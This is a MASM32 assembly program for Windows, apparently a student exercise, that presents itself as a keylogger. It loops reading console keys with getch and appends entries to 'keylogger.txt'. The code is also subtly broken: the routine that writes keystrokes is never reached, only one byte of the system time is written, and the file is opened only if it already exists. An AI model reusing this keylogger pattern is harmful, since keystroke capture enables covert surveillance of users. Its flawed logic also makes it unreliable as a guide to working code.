.386
.model flat, stdcall
option casemap:none
include \masm32\include\windows.inc
include \masm32\include\kernel32.inc
include \masm32\include\masm32.inc
include \masm32\include\masm32rt.inc
include \masm32\include\user32.inc
includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\masm32.lib
includelib \masm32\lib\user32.lib

WinMain proto :DWORD, :DWORD, :DWORD, :DWORD
;data segment
.data

	directorio		byte "keylogger.txt",NULL
	error1			db "No se pudo crear el archivo",0
	inicio			db "Keylogger iniciado", 10, 0
	continuacion	db "Presione una tecla para continaur", 10, 0
	slash			dw "/",NULL
	puntos			dw ":",NULL

	sysTime			SYSTEMTIME <>
	org sysTime
	wYear			dw 0
	wMonth			dw 0
	wToDay			dw 0 ; Sunday 0 to Saturday 6
	wDay			dw 0
	wHour			dw 0
	wMinute			dw 0
	wSecond			dw 0
	wKsecond		dw 0
	date_buf		db 50 dup (32)
	time_buf		db 20 dup (32)
	dateformat		db " dddd, MMMM, dd, yyyy", 0
					db 0
	timeformat		db "hh:mm:ss tt", 0

.data?
	fecha			dd ?
	manejo			dd ?
	key				dd ?
	bytesw			dd ?
	cadenaFinal		db ?
.code
program:
	CALL main
	main PROC

		INVOKE				StdOut, ADDR inicio
		INVOKE				StdOut, ADDR continuacion

		MOV					edx, OFFSET directorio
		
		INVOKE				CreateFile, ADDR directorio, GENERIC_WRITE OR GENERIC_READ, FILE_SHARE_READ OR FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0
		MOV					manejo, EAX
		CMP					EAX, INVALID_HANDLE_VALUE
		JE					fin_programa

		keylogger:

			CALL			crt__getch
			MOV				key, EAX
			CMP				EAX, 0
			JE				seguir

		verificacion:

			MOV				EBX, key						;moviendo la entrada a la variable "key"
			CMP				EBX, 0ah						;si es un espacio
			JZ				EscribirFecha
			CMP				EBX, 13							;si es un ENTER
			JZ				EscribirFecha
			JMP				seguir							;de lo contrario, sigue leyendo teclado

		seguir:
			JMP				keylogger


		fin_programa:
			INVOKE			ExitProcess, 0

		EscribirClave:
			INVOKE			CreateFile, ADDR directorio, GENERIC_WRITE OR GENERIC_READ, FILE_SHARE_READ OR FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0
			MOV				manejo, EAX
			INVOKE			SetFilePointer, manejo, 0, 0, FILE_END
			INVOKE			WriteFile, manejo, ADDR key, 1, ADDR bytesw, NULL
			MOV				EAX, manejo
			INVOKE			CloseHandle, EAX
			JMP				verificacion

		EscribirFecha:
			INVOKE			GetSystemTime, addr sysTime
			INVOKE			CreateFile, ADDR directorio, GENERIC_WRITE OR GENERIC_READ, FILE_SHARE_READ OR FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0
			MOV				manejo, EAX
			INVOKE			SetFilePointer, manejo, 0, 0, FILE_END
			INVOKE			WriteFile, manejo, addr sysTime, 1, ADDR bytesw, NULL
			MOV				EAX, manejo
			INVOKE			CloseHandle, EAX
			JMP				seguir

	main ENDP
END program